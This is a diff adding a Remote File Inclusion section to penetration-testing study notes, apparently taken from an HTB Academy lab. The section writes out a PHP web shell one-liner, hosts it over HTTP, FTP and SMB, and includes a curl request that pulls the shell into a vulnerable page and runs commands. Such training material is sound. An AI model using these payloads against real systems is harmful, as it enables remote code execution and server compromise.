@@ -30,6 +30,13 @@
         - [Remote Code Execution](#remote-code-execution-1)
       - [Input](#input)
       - [Expect](#expect)
+    - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+      - [Local vs. Remote File Inclusion](#local-vs-remote-file-inclusion)
+      - [Verify RFI](#verify-rfi)
+      - [RCE with RFI](#rce-with-rfi)
+        - [HTTP](#http)
+        - [FTP](#ftp)
+        - [SMB](#smb)
 
 ---
 
@@ -457,3 +464,119 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 As you can see, executing commands through the ```expect``` module is fairly straightforward.
+
+### Remote File Inclusion (RFI)
+
+#### Local vs. Remote File Inclusion
+
+When a vulnerable function allows you to include remote files, you may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain RCE. Following functions that would allow RFI if vulnerable:
+
+| Function | Read Content | Execute | Remote URL |
+| -------- | ------------ | ------- | ---------- |
+| **PHP** |||
+| ```include()``` / ```include_once()``` | YES | YES | YES |
+| ```file_get_contents()``` | YES | NO | YES |
+| **Java** |||
+| ```import``` | YES | YES | YES |
+| **.NET** |||
+| ```@Html.RemotePartial()``` | YES | NO | YES |
+| ```include``` | YES | YES | YES |
+
+#### Verify RFI
+
+In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the ```allow_url_include``` setting to be enabled. You can check whether this setting is enabled through LFI:
+
+```bash
+d41y@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include an URL, and see if you can get its content. At first, you should always start by trying to include a local URL to ensure your attempt does not get blocked by a firewall or other security measures. Use ```http://127.0.0.1:80/index.php``` as you input string and see if it gets included.
+
+![lfi 13](../../../../images/lfi13.png)
+
+As you can see, the ```index.php``` got included in the vulnerable section, so the page is indeed vulnerable to RFI, as you are able to include URLs. Furthermore, the ```index.php``` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow you to execute code if you include a malicious PHP script that you host on your machine.
+
+You also see that you were able to specify port 80 and get the web app on that port. If the back-end hosted any other local web app, then you may be able to access them through the RFI vulnerability by applying SSRF techniques on it.
+
+#### RCE with RFI
+
+The first step in gaining RCE is creating a malicious script in the language of the web app, PHP in this case.
+
+```bash
+d41y@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Now, all you need to do is host the script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web app has a firewall preventing outgoing connections. Furthermore, you may host the script through an FTP service or an SMB service.
+
+##### HTTP
+
+Now, you can start a server on your machine with a basic python server:
+
+```bash
+d41y@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+```
+
+Now, you can include your local shell through RFI. You will also specify the command to be executed.
+
+![lfi 14](../../../../images/lfi14.png)
+
+As you can see, you did get a connection on your python server, and the remote shell was included, and you executed the specified command:
+
+```bash
+d41y@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+
+SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+```
+
+##### FTP
+
+You may also host your script through the FTP protocol. You can start a basic FTP server with Python's ```pyftpdlib```:
+
+```bash
+d41y@htb[/htb]$ sudo python -m pyftpdlib -p 21
+
+[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
+[SNIP] concurrency model: async
+[SNIP] masquerade (NAT) address: None
+[SNIP] passive ports: None
+```
+
+This may be useful in case HTTP ports are blocked by a firewall or the ```http://``` string gets blocked by a WAF. To include your script, you can repeat what you did earlier, but use the ```ftp://``` scheme in the URL.
+
+![lfi 15](../../../../images/lfi15.png)
+
+As you can see, this worked very similar to your HTTP attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL:
+
+```bash
+d41y@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+...SNIP...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+##### SMB
+
+If the vulnerable web app is hosted on a windows server, then you do not need the ```allow_url_include``` setting to be enabled for RFI exploitation, as you can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
+
+You can spin up an SMB server using Impacket's ```smbserver.py```, which allows anonymous authentication by default:
+
+```bash
+d41y@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+Now, you can include your script by using a UNC path (```\\<OUR_IP>\share\shell.php```), and specify the command with ```&cmd=whoami``` as you did earlier:
+
+![lfi 16](../../../../images/lfi16.png)
+
+As you can see, this attack works in including your remote script, and you do not need any non-default settings to be enabled. However, you must note that this technique is more likely to work if you were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows Server configurations.
